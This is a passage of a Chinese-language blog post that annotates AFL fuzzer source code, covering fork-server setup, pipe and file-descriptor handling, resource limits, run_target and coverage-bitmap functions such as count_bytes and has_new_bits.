</ul>
</li>
</ul>
<h5 id="init-forkserver父进程行为"><a href="#init-forkserver父进程行为" class="headerlink" title="init_forkserver父进程行为"></a>init_forkserver父进程行为</h5><ul>
<li>以下都是父进程要执行的代码<ul>
<li>关闭不需要的endpoints</li>
</ul>
</li>
</ul>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 关闭不是需要的endpoints</span></span><br><span class="line"><span class="built_in">close</span>(ctl_pipe[<span class="number">0</span>]);</span><br><span class="line"><span class="built_in">close</span>(st_pipe[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">fsrv_ctl_fd = ctl_pipe[<span class="number">1</span>]; <span class="comment">//父进程只能发送(&quot;写出&quot;)命令\</span></span><br><span class="line"><span class="comment">fsrv_st_fd = st_pipe[0];   //父进程只能读取状态</span></span><br></pre></td></tr></table></figure>

<ul>
<li>init_forkserver设置子进程超时</li>
<li>之前设置了 timeout方法  [[#setup_signal_handlers]]</li>
</ul>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Wait for the fork server to come up, but don&#x27;t wait too long. */</span></span><br><span class="line">it.it_value.tv_sec = ((exec_tmout * FORK_WAIT_MULT) / <span class="number">1000</span>);</span><br><span class="line">it.it_value.tv_usec = ((exec_tmout * FORK_WAIT_MULT) % <span class="number">1000</span>) * <span class="number">1000</span>;</span><br><span class="line"><span class="built_in">setitimer</span>(ITIMER_REAL, &amp;it, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">rlen = <span class="built_in">read</span>(fsrv_st_fd, &amp;status, <span class="number">4</span>);</span><br><span class="line">it.it_value.tv_sec = <span class="number">0</span>;</span><br><span class="line">it.it_value.tv_usec = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">setitimer</span>(ITIMER_REAL, &amp;it, <span class="literal">NULL</span>);</span><br></pre></td></tr></table></figure>

<ul>
<li>等待fork server启动，但是不能等太久。（所以在调试时要注意这个…） 设置-t<ul>
<li>从管道里读取4个字节到status里，如果读取成功，则代表fork server成功启动，就结束这个函数并返回。</li>
<li>如果超时，就抛出异常。</li>
</ul>
</li>
<li></li>
</ul>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="built_in">ACTF</span>(<span class="string">&quot;read pipe block&quot;</span>);</span><br><span class="line">rlen = <span class="built_in">read</span>(fsrv_st_fd, &amp;status, <span class="number">4</span>);</span><br></pre></td></tr></table></figure>

<ul>
<li>这里阻塞进入子进程 [[#init_forkserver子进程行为]]</li>
</ul>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">it.it_value.tv_sec = <span class="number">0</span>;</span><br><span class="line">it.it_value.tv_usec = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">setitimer</span>(ITIMER_REAL, &amp;it, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* If we have a four-byte &quot;hello&quot; message from the server, we&#x27;re all set.</span></span><br><span class="line"><span class="comment">   Otherwise, try to figure out what went wrong. */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (rlen == <span class="number">4</span>) &#123;</span><br><span class="line">  <span class="built_in">OKF</span>(<span class="string">&quot;All right - fork server is up.&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>之后关闭timer 然后读取到4字节退出返回父进程</li>
</ul>
<h5 id="init-forkserver子进程行为"><a href="#init-forkserver子进程行为" class="headerlink" title="init_forkserver子进程行为"></a>init_forkserver子进程行为</h5><ul>
<li>进入 <code>if(!forksrv_pid)</code><ul>
<li>在 fork 服务器初始化时执行的，其主要目的是设置子进程的执行环境，然后使用 <code>execv</code> 调用目标二进制文件</li>
<li>设置文件描述符限制</li>
<li>做重定向<ul>
<li><code>dev_null_fd = open(&quot;/dev/null&quot;, O_RDWR);</code> 之前</li>
<li><code>dup2(dev_null_fd, 1);</code> 标准输出（文件描述符 1）</li>
<li><code>dup2(dev_null_fd, 2);</code> 标准错误（文件描述符 2）</li>
<li>如果指定了 <code>out_file</code>   <code>dup2(dev_null_fd, 0);</code> 将标准输入重定向到 <code>/dev/null</code><ul>
<li>否则 <code>dup2(out_fd, 0);</code> <code>标准输入重定向到文件</code></li>
</ul>
</li>
<li><strong>子进程只能读取命令</strong>   <code>dup2(ctl_pipe[0], FORKSRV_FD)</code></li>
<li><strong>子进程只能发送(“写出”)状态</strong> <code>dup2(st_pipe[1], FORKSRV_FD + 1) &lt; 0)</code></li>
</ul>
</li>
<li>关闭子进程里的一些文件描述符</li>
</ul>
</li>
</ul>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">    <span class="keyword">struct</span> <span class="title class_">rlimit</span> r;</span><br><span class="line">    <span class="comment">/* Umpf. On OpenBSD, the default fd limit for root users is set to</span></span><br><span class="line"><span class="comment">       soft 128. Let&#x27;s try to fix that... */</span></span><br><span class="line">    <span class="comment">// 获取当前进程的文件描述符限制。`RLIMIT_NOFILE` 表示文件描述符数量的限制。</span></span><br><span class="line">    <span class="comment">// r.rlim_cur 表示当前进程的软限制，即允许的最大文件描述符数量。</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">getrlimit</span>(RLIMIT_NOFILE, &amp;r) &amp;&amp; r.rlim_cur &lt; FORKSRV_FD + <span class="number">2</span>) &#123;</span><br><span class="line">      r.rlim_cur = FORKSRV_FD + <span class="number">2</span>;</span><br><span class="line">      <span class="built_in">setrlimit</span>(RLIMIT_NOFILE, &amp;r); <span class="comment">/* Ignore errors */</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (mem_limit) &#123; <span class="comment">// 默认50</span></span><br><span class="line">      r.rlim_max = r.rlim_cur = ((<span class="type">rlim_t</span>)mem_limit) &lt;&lt; <span class="number">20</span>; <span class="comment">// 50 ^20 = 52428800</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> RLIMIT_AS</span></span><br><span class="line">      <span class="built_in">setrlimit</span>(RLIMIT_AS, &amp;r); <span class="comment">/* Ignore errors */</span></span><br><span class="line">      <span class="comment">// 来设置进程的地址空间限制，即最大可用虚拟内存空间的限制。</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"></span><br><span class="line">      <span class="comment">/* This takes care of OpenBSD, which doesn&#x27;t have RLIMIT_AS, but</span></span><br><span class="line"><span class="comment">         according to reliable sources, RLIMIT_DATA covers anonymous</span></span><br><span class="line"><span class="comment">         maps - so we should be getting good protection against OOM bugs. */</span></span><br><span class="line"></span><br><span class="line">      <span class="built_in">setrlimit</span>(RLIMIT_DATA, &amp;r); <span class="comment">/* Ignore errors */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* ^RLIMIT_AS */</span></span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* Dumping cores is slow and can lead to anomalies if SIGKILL is delivered</span></span><br><span class="line"><span class="comment">       before the dump is complete. */</span></span><br><span class="line">    <span class="comment">// 设置进程的 core dump（核心转储）限制，即当程序发生崩溃或异常情况时，是否生成核心转储文件。核心转储文件通常用于帮助开发人员诊断程序崩溃的原因</span></span><br><span class="line">    r.rlim_max = r.rlim_cur = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">setrlimit</span>(RLIMIT_CORE, &amp;r); <span class="comment">/* Ignore errors */</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* Isolate the process and configure standard descriptors. If out_file is</span></span><br><span class="line"><span class="comment">       specified, stdin is /dev/null; otherwise, out_fd is cloned instead. */</span></span><br><span class="line">       <span class="comment">/*</span></span><br><span class="line"><span class="comment">1.  如果调用进程不是一个会话首领（leader），则创建一个新的会话。这意味着调用进程将成为这个新会话的首领。</span></span><br><span class="line"><span class="comment">2.  调用进程将成为新会话的首进程（session leader），新会话中的所有进程都将与控制终端分离。</span></span><br><span class="line"><span class="comment">3.  调用进程不再有控制终端，这是因为新会话中的进程不再与之前的会话或进程组关联。</span></span><br><span class="line"><span class="comment">4. 这个函数通常在后台进程启动时使用，以确保后台进程与终端的完全分离，不会受到终端关闭或其他终端相关操作的影响。</span></span><br><span class="line"><span class="comment">       需要注意的是，`setsid()` 只能由非会话首领进程调用。如果调用进程已经是会话首领，则调用 `setsid()` 会失败。通常情况下，需要在 `fork()` 之后，但在 `exec()` 之前调用 `setsid()`，以确保在新进程中创建新的会话。</span></span><br><span class="line"><span class="comment">       */</span></span><br><span class="line">    <span class="built_in">setsid</span>();</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">dup2</span>(dev_null_fd, <span class="number">1</span>); <span class="comment">// 之前 dev_null_fd = open(&quot;/dev/null&quot;, O_RDWR);</span></span><br><span class="line">    <span class="built_in">dup2</span>(dev_null_fd, <span class="number">2</span>);</span><br><span class="line">    <span class="keyword">if</span> (out_file) &#123;</span><br><span class="line">      <span class="built_in">dup2</span>(dev_null_fd, <span class="number">0</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="built_in">dup2</span>(out_fd, <span class="number">0</span>);</span><br><span class="line">      <span class="built_in">close</span>(out_fd);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* Set up control and status pipes, close the unneeded original fds. */</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">dup2</span>(ctl_pipe[<span class="number">0</span>], FORKSRV_FD) &lt; <span class="number">0</span>) <span class="built_in">PFATAL</span>(<span class="string">&quot;dup2() failed&quot;</span>);    <span class="comment">// 子进程只能读取命令</span></span><br><span class="line">    <span class="comment">// 将 `ctl_pipe[0]` 的文件描述符复制到 `FORKSRV_FD` 的位置，`FORKSRV_FD` 通常是一个预定义的值。这实际上是为子进程设置了一个与父进程通信的管道，子进程可以通过这个文件描述符从管道读取数据</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">dup2</span>(st_pipe[<span class="number">1</span>],  FORKSRV_FD + <span class="number">1</span>) &lt; <span class="number">0</span>) <span class="built_in">PFATAL</span>(<span class="string">&quot;dup2() failed&quot;</span>);<span class="comment">// 子进程只能发送(写出)状态</span></span><br><span class="line">    <span class="comment">// 将 `st_pipe[1]` 的文件描述符复制到 `FORKSRV_FD + 1` 的位置，也就是为子进程设置了一个与父进程通信的管道，子进程可以通过这个文件描述符向管道写入数据。</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 关闭子进程里的一些文件描述符</span></span><br><span class="line">    <span class="comment">// 关闭所有的管道是为了确保子进程在不再需要这些管道时不会产生资源泄漏。关闭管道并不会影响之前创建的重定向，因为这些重定向是通过 `dup2` 函数实现的，而不是通过打开文件来实现的</span></span><br><span class="line">    <span class="comment">// 首先使用 dup2 函数将管道的文件描述符复制到特定的位置（比如 FORKSRV_FD 和 FORKSRV_FD + 1），这样子进程就能够通过这些文件描述符进行与父进程的通信。</span></span><br><span class="line">    <span class="built_in">close</span>(ctl_pipe[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">close</span>(ctl_pipe[<span class="number">1</span>]);</span><br><span class="line">    <span class="built_in">close</span>(st_pipe[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">close</span>(st_pipe[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">close</span>(out_dir_fd);  <span class="comment">// 用于输出目录的文件描述符，</span></span><br><span class="line">    <span class="built_in">close</span>(dev_null_fd); <span class="comment">// 用于 `/dev/null` 文件的文件描述符，它被用来关闭子进程中的标准输出和标准错误输出</span></span><br><span class="line">    <span class="built_in">close</span>(dev_urandom_fd); <span class="comment">// 这是之前用于随机数生成的 `/dev/urandom` 文件的文件描述符。在子进程中，随机数生成可能不再需要，所以可以关闭这个文件描述符</span></span><br><span class="line">    <span class="built_in">close</span>(<span class="built_in">fileno</span>(plot_file)); <span class="comment">// 这是之前用于绘制图表的文件描述符。</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* This should improve performance a bit, since it stops the linker from</span></span><br><span class="line"><span class="comment">       doing extra work post-fork(). */</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">getenv</span>(<span class="string">&quot;LD_BIND_LAZY&quot;</span>)) <span class="built_in">setenv</span>(<span class="string">&quot;LD_BIND_NOW&quot;</span>, <span class="string">&quot;1&quot;</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="comment">// int setenv(const char *name, const char *value, int overwrite);</span></span><br><span class="line">    <span class="comment">// 读取环境变量LD_BIND_LAZY，如果没有设置，则设置环境变量LD_BIND_NOW为1</span></span><br><span class="line">    <span class="comment">// 这段代码的作用是尝试提高性能，通过设置环境变量 `LD_BIND_NOW` 来告诉链接器在 fork 子进程之后不要进行额外的工作。</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">-   在 Unix-like 操作系统中，当一个程序运行时，它需要加载所需的库和符号，这些操作需要进行符号解析和动态链接。链接器通常会延迟加载这些库，即在实际需要时再加载，这被称为 &quot;lazy binding&quot;。这样做可以在启动时减少加载时间，但在程序执行过程中可能会引入一些额外的开销。</span></span><br><span class="line"><span class="comment">-   在这段代码中，它首先检查环境变量 `LD_BIND_LAZY` 是否已设置。如果没有设置，意味着程序没有显式地要求启用 &quot;lazy binding&quot;。</span></span><br><span class="line"><span class="comment">-   然后，它调用 `setenv` 函数，将环境变量 `LD_BIND_NOW` 设置为 `&quot;1&quot;`，即告诉链接器在加载程序时立即进行符号解析和链接，而不是延迟加载。这种设置可以减少子进程 fork 后链接器所需的额外工作，从而可能提高程序执行的性能。</span></span><br><span class="line"><span class="comment">总之，这段代码是为了尝试在 fork 子进程后通过禁用 &quot;lazy binding&quot; 来提高性能。不过，这个设置的效果可能因操作系统和程序的不同而有所不同。</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="comment">/* Set sane defaults for ASAN if nothing else specified. */</span></span><br><span class="line">    <span class="comment">// 一种内存错误检测工具</span></span><br><span class="line">    <span class="built_in">setenv</span>(<span class="string">&quot;ASAN_OPTIONS&quot;</span>, <span class="string">&quot;abort_on_error=1:&quot;</span> </span><br><span class="line">    <span class="comment">// `abort_on_error=1`：当检测到内存错误时，立即中止程序的执行。</span></span><br><span class="line">                           <span class="string">&quot;detect_leaks=0:&quot;</span></span><br><span class="line">    <span class="comment">// `detect_leaks=0`：禁用内存泄漏检测。</span></span><br><span class="line">                           <span class="string">&quot;symbolize=0:&quot;</span></span><br><span class="line">    <span class="comment">// symbolize=0：禁用符号化，即不在报告中显示函数名、行号等信息。</span></span><br><span class="line">                           <span class="string">&quot;allocator_may_return_null=1&quot;</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="comment">// allocator_may_return_null=1：分配器在无法分配内存时返回 NULL，而不是触发错误。</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* MSAN is tricky, because it doesn&#x27;t support abort_on_error=1 at this</span></span><br><span class="line"><span class="comment">       point. So, we do this in a very hacky way. */</span></span><br><span class="line">    <span class="comment">// 一种用于检测未初始化内存访问的工具 </span></span><br><span class="line">    <span class="comment">// 由于它在代码执行期间模拟了对未初始化内存的读取，因此与其他工具相比稍显复杂</span></span><br><span class="line">    <span class="built_in">setenv</span>(<span class="string">&quot;MSAN_OPTIONS&quot;</span>, <span class="string">&quot;exit_code=&quot;</span> <span class="built_in">STRINGIFY</span>(MSAN_ERROR) <span class="string">&quot;:&quot;</span></span><br><span class="line">                           <span class="string">&quot;symbolize=0:&quot;</span></span><br><span class="line">                           <span class="string">&quot;abort_on_error=1:&quot;</span> </span><br><span class="line">    <span class="comment">// 在此时并不受支持，因此使用了一种“hacky”的方式来实现类似的效果。</span></span><br><span class="line">                           <span class="string">&quot;allocator_may_return_null=1:&quot;</span></span><br><span class="line">                           <span class="string">&quot;msan_track_origins=0&quot;</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">execv</span>(target_path, argv);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Use a distinctive bitmap signature to tell the parent about execv()</span></span><br><span class="line"><span class="comment">       falling through. */</span></span><br><span class="line">   <span class="comment">// 为了告知父进程 `execv` 执行失败，这段代码通过修改内存中的 `trace_bits`（位图数组）的内容来传递信息。具体来说，它将特定的标识值 `EXEC_FAIL_SIG` 赋值给 `trace_bits` 数组的前四个字节，然后调用 `exit(0)` 终止当前进程的执行。</span></span><br><span class="line">    *(u32*)trace_bits = EXEC_FAIL_SIG; <span class="comment">// 0xfee1dead </span></span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br></pre></td></tr></table></figure>

<ul>
<li><code>execv(target_path, argv)</code>带参数执行target,这个函数除非出错不然不会返回。</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">- `/home/wutang/Desktop/google_afl/llvm_mode/test-instr /home/wutang/Desktop/fuzz_test/fuzz_output/fuzzer1/.cur_input`</span><br><span class="line">-   execv会替换掉原有的进程空间为target_path代表的程序，所以相当于后续就是去执行target_path，这个程序结束的话，子进程就结束。</span><br><span class="line">-   **而在这里非常特殊，第一个target会进入`__afl_maybe_log`里的`__afl_fork_wait_loop`，并充当fork server，在整个Fuzz的过程中，它都不会结束，每次要Fuzz一次target，都会从这个fork server fork出来一个子进程去fuzz。**</span><br></pre></td></tr></table></figure>

<ul>
<li>使用一个独特的<code>bitmaps EXEC_FAIL_SIG(0xfee1dead)</code>写入<code>trace_bits</code>，来告诉父进程执行失败，并结束子进程。</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">- 后续有检测 `if (*(u32*)trace_bits == EXEC_FAIL_SIG)`</span><br></pre></td></tr></table></figure>

<h5 id="execv子进程继续执行插入的代码"><a href="#execv子进程继续执行插入的代码" class="headerlink" title="execv子进程继续执行插入的代码"></a>execv子进程继续执行插入的代码</h5><ul>
<li>这里使用trace-pc模式 [[#trace-pc-guard mode-测试]]</li>
</ul>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">/home/wutang/Desktop/google_afl/llvm_mode/test-instr /home/wutang/Desktop/fuzz_test/fuzz_output/fuzzer1/.cur_input</span><br></pre></td></tr></table></figure>

<h4 id="void-write-to-testcase-void-mem-u32-len"><a href="#void-write-to-testcase-void-mem-u32-len" class="headerlink" title="void write_to_testcase(void *mem, u32 len)"></a>void write_to_testcase(void *mem, u32 len)</h4><ul>
<li>将从<code>mem</code>中读取<code>len</code>个字节，写入到<code>.cur_input</code>中</li>
<li>如果没指定<code>@@</code> 也就是<code>out_fd=null</code>就继续写入 out_fd<ul>
<li>[[#setup_stdio_file]] 里设置的out_fd</li>
</ul>
</li>
</ul>
<h4 id="u8-run-target-char-argv-u32-timeout"><a href="#u8-run-target-char-argv-u32-timeout" class="headerlink" title="u8 run_target(char **argv, u32 timeout)"></a>u8 run_target(char **argv, u32 timeout)</h4><ul>
<li>通过Fork-server 开始fork出子进程进进行fuzz, <strong>对trace_bits进行赋值</strong>，运行目标应用程序并监控是否超时，返回运行结果的状态信息<ul>
<li>先清空<code>trace_bits[MAP_SIZE]</code>，将其全置为0，也就是清空共享内存。</li>
<li>如果<code>dumb_mode</code>等于1，且<code>no_forkserver</code>，则</li>
<li>直接fork出一个子进程，然后让子进程execv去执行target，如果execv执行失败，则向<code>trace_bits</code>写入<code>EXEC_FAIL_SIG</code> 类似上面的操作</li>
<li>否则与子进程通信</li>
<li>向<code>fsrv_ctl_fd</code> 写入<code>prev_timed_out</code>的值，命令<code>Fork server</code>开始fork出一个子进程进行fuzz，然后从状态管道读取<code>fork server</code>返回的fork出的子进程的ID到<code>child_pid</code></li>
<li>超时任务</li>
<li>无论实际执行的是上面两种的哪一种，在执行target期间，都设置计数器为<code>timeout</code>，如果超时，就杀死正在执行的子进程，并设置 <code>child_timed_out</code>为1;</li>
<li><code>setitimer(ITIMER_REAL, &amp;it, NULL);</code></li>
<li>等待target执行结束，如果是dumb_mode ，target执行结束的状态码将直接保存到status中，如果不是dumb_mode，则从状态管道中读取target执行结束的状态码。<ul>
<li><code>read(fsrv_st_fd, &amp;status, 4)</code> 获取状态码 256</li>
<li><code>if (!WIFSTOPPED(status)) child_pid = 0;</code> 设置child_pid&#x3D;0</li>
</ul>
</li>
<li>计算target执行时间<code>exec_ms</code>，并将<code>total_execs</code>这个执行次数计数器加一。</li>
<li><code>classify_counts((u64 *) trace_bits)</code> [[#classify_counts(u64 *mem)]] 用于将跟踪计数转换为分类信息的函数，目的是优化稀疏位图的处理。 <strong>对trace_bits进行赋值。</strong><ul>
<li>具体地，target是将每个分支的执行次数用1个byte来储存，而fuzzer则进一步把这个执行次数归入到buckets中，举个例子，如果某分支执行了1次，那么落入第2个bucket，其计数 byte 仍为1；如果某分支执行了4次，那么落入第5个bucket，其计数byte将变为8，等等。</li>
<li>这样处理之后，对分支执行次数就会有一个简单的归类。例如，如果对某个测试用例处理时，分支A执行了32次；对另外一个测试用例，分支A执行了33次，那么AFL就会认为这两次的代码覆盖是相同的。当然，这样的简单分类肯定不能区分所有的情况，不过在某种程度上，处理了一些因为循环次数的微小区别，而误判为不同执行结果的情况.</li>
</ul>
</li>
<li>设置 <code>prev_timed_out</code> 的值为 <code>child_timed_out</code></li>
<li>接着依据status的值，向调用者返回结果。</li>
<li><code>WIFSIGNALED(status)</code>若为异常结束子进程返回的状态，则为真<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-   `WTERMSIG(status)`取得子进程因信号而中止的信号代码</span><br><span class="line">  -   如果child_timed_out为1，且状态码为`SIGKILL`，则返回`FAULT_TMOUT`</span><br><span class="line">  -   否则返回`FAULT_CRASH`</span><br></pre></td></tr></table></figure></li>
<li>如果是<code>dumb_mode</code>，且 <code>trace_bits</code>为<code>EXEC_FAIL_SIG</code>，就返回<code>FAULT_ERROR</code></li>
<li>设置执行时间 <code>slowest_exec_ms</code><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">- 如果`timeout`小于等于`exec_tmout`，且`slowest_exec_ms`小于`exec_ms`，设置`slowest_exec_ms`等于`exec_ms`</span><br></pre></td></tr></table></figure></li>
<li>返回<code>FAULT_NONE</code></li>
</ul>
</li>
</ul>
<h4 id="classify-counts-u64-mem"><a href="#classify-counts-u64-mem" class="headerlink" title="classify_counts(u64 *mem)"></a>classify_counts(u64 *mem)</h4><ul>
<li>用于将跟踪计数转换为分类信息的函数，目的是优化稀疏位图的处理。</li>
<li>8个字节一组去循环读入，直到遍历完整个mem</li>
<li>每次取两个字节<code>u16 *mem16 = (u16 *) mem</code></li>
<li>i从0到3，计算<code>mem16[i]</code>的值，在<code>count_class_lookup16[mem16[i]]</code>里找到对应的取值，并赋值给<code>mem16[i]</code></li>
</ul>
<h4 id="u32-count-bytes-u8-mem"><a href="#u32-count-bytes-u8-mem" class="headerlink" title="u32 count_bytes(u8 *mem)"></a>u32 count_bytes(u8 *mem)</h4><ul>
<li>计算在位图中设置为1的字节数量的函数, 验证 0x4000 字节的数据</li>
<li>[[CSAPP_深入理解计算机系统#掩码]]</li>
</ul>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 这个宏定义 FF(_b) 是用来生成一个指定位数的字节掩码的，具体解释如下：</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FF(_b)  (0xff &lt;&lt; ((_b) &lt;&lt; 3))</span></span><br><span class="line"><span class="comment">// 这里的 `(_b) &lt;&lt; 3` 相当于将 `_b` 乘以 8，是因为每个字节有 8 位</span></span><br><span class="line"><span class="comment">// 用于生成一个 8 位字节的掩码，该掩码在指定位置 `_b` 上的位为1，其他位置的位为0</span></span><br><span class="line">如果 _b 的值为 <span class="number">0</span>，那么 _b &lt;&lt; <span class="number">3</span> 就是 <span class="number">0</span>，掩码就是 <span class="number">0xff</span>，即所有位都是 <span class="number">1</span>的字节。</span><br><span class="line">如果 _b 的值为 <span class="number">1</span>，那么 _b &lt;&lt; <span class="number">3</span> 就是 <span class="number">8</span>，掩码就是 <span class="number">0xff00</span>，表示在第二个字节位置上的掩码。</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Count the number of bytes set in the bitmap. Called fairly sporadically,</span></span><br><span class="line"><span class="comment">   mostly to update the status screen or calibrate and examine confirmed</span></span><br><span class="line"><span class="comment">   new paths. */</span></span><br><span class="line"><span class="function"><span class="type">static</span> u32 <span class="title">count_bytes</span><span class="params">(u8* mem)</span> </span>&#123;</span><br><span class="line">  u32* ptr = (u32*)mem;</span><br><span class="line">  u32  i   = (MAP_SIZE &gt;&gt; <span class="number">2</span>);</span><br><span class="line">  u32  ret = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> (i--) &#123;</span><br><span class="line">    u32 v = *(ptr++);</span><br><span class="line">    <span class="keyword">if</span> (!v) <span class="keyword">continue</span>;</span><br><span class="line">    <span class="keyword">if</span> (v &amp; <span class="built_in">FF</span>(<span class="number">0</span>)) ret++;</span><br><span class="line">    <span class="keyword">if</span> (v &amp; <span class="built_in">FF</span>(<span class="number">1</span>)) ret++;</span><br><span class="line">    <span class="keyword">if</span> (v &amp; <span class="built_in">FF</span>(<span class="number">2</span>)) ret++;</span><br><span class="line">    <span class="keyword">if</span> (v &amp; <span class="built_in">FF</span>(<span class="number">3</span>)) ret++;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="inline-u32-hash32-const-void-key-u32-len-u32-seed"><a href="#inline-u32-hash32-const-void-key-u32-len-u32-seed" class="headerlink" title="inline u32 hash32(const void* key, u32 len, u32 seed)"></a>inline u32 hash32(const void* key, u32 len, u32 seed)</h4><ul>
<li>计算哈希值的函数 <code>hash32</code>，用于计算32位哈希值。计算长度为2的16次方hash</li>
</ul>
<h4 id="char-has-new-bits-u8-virgin-map"><a href="#char-has-new-bits-u8-virgin-map" class="headerlink" title="char has_new_bits(u8 *virgin_map)"></a>char has_new_bits(u8 *virgin_map)</h4><ul>
<li>这段代码的主要目的是检查当前执行路径是否带来了新的信息（新的位）。它会更新”virgin_map”以反映新发现的位，并返回不同的值来表示发现的情况<ul>
<li>如果只有特定元组的命中计数发生变化，则返回1。</li>
<li>如果发现了新的元组，则返回2。</li>
<li>如果没有发现新的位，则返回0。</li>
</ul>
</li>
</ul>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Check if the current execution path brings anything new to the table.</span></span><br><span class="line"><span class="comment">   Update virgin bits to reflect the finds. Returns 1 if the only change is</span></span><br><span class="line"><span class="comment">   the hit-count for a particular tuple; 2 if there are new tuples seen. </span></span><br><span class="line"><span class="comment">   Updates the map, so subsequent calls will always return 0.</span></span><br><span class="line"><span class="comment">   This function is called after every exec() on a fairly large buffer, so</span></span><br><span class="line"><span class="comment">   it needs to be fast. We do this in 32-bit and 64-bit flavors. */</span></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="keyword">inline</span> u8 <span class="title">has_new_bits</span><span class="params">(u8* virgin_map)</span> </span>&#123;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> WORD_SIZE_64</span></span><br><span class="line">  u64* current = (u64*)trace_bits;</span><br><span class="line">  u64* virgin  = (u64*)virgin_map;</span><br><span class="line">  u32  i = (MAP_SIZE &gt;&gt; <span class="number">3</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">  u32* current = (u32*)trace_bits;</span><br><span class="line">  u32* virgin  = (u32*)virgin_map;</span><br><span class="line">  u32  i = (MAP_SIZE &gt;&gt; <span class="number">2</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* ^WORD_SIZE_64 */</span></span></span><br><span class="line">  u8   ret = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> (i--) &#123;</span><br><span class="line">    <span class="comment">/* Optimize for (*current &amp; *virgin) == 0 - i.e., no bits in current bitmap</span></span><br><span class="line"><span class="comment">       that have not been already cleared from the virgin map - since this will</span></span><br><span class="line"><span class="comment">       almost always be the case. */</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">unlikely</span>(*current) &amp;&amp; <span class="built_in">unlikely</span>(*current &amp; *virgin)) &#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="built_in">likely</span>(ret &lt; <span class="number">2</span>)) &#123;</span><br><span class="line">        u8* cur = (u8*)current;</span><br><span class="line">        u8* vir = (u8*)virgin;</span><br><span class="line">        <span class="comment">/* Looks like we have not found any new bytes yet; see if any non-zero</span></span><br><span class="line"><span class="comment">           bytes in current[] are pristine in virgin[]. */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> WORD_SIZE_64</span></span><br><span class="line">        <span class="comment">// 如果只有特定元组的命中计数发生变化，则返回1。</span></span><br><span class="line">        <span class="comment">// 当前bitmap中的某些位在&quot;virgin_map&quot;中仍然是&quot;1&quot;，表示有新的位被发现。这时，代码会遍历当前bitmap，更新&quot;virgin_map&quot;，并根据情况设置返回值ret为1或2。</span></span><br><span class="line">        <span class="keyword">if</span> ((cur[<span class="number">0</span>] &amp;&amp; vir[<span class="number">0</span>] == <span class="number">0xff</span>) || (cur[<span class="number">1</span>] &amp;&amp; vir[<span class="number">1</span>] == <span class="number">0xff</span>) ||</span><br><span class="line">            (cur[<span class="number">2</span>] &amp;&amp; vir[<span class="number">2</span>] == <span class="number">0xff</span>) || (cur[<span class="number">3</span>] &amp;&amp; vir[<span class="number">3</span>] == <span class="number">0xff</span>) ||</span><br><span class="line">            (cur[<span class="number">4</span>] &amp;&amp; vir[<span class="number">4</span>] == <span class="number">0xff</span>) || (cur[<span class="number">5</span>] &amp;&amp; vir[<span 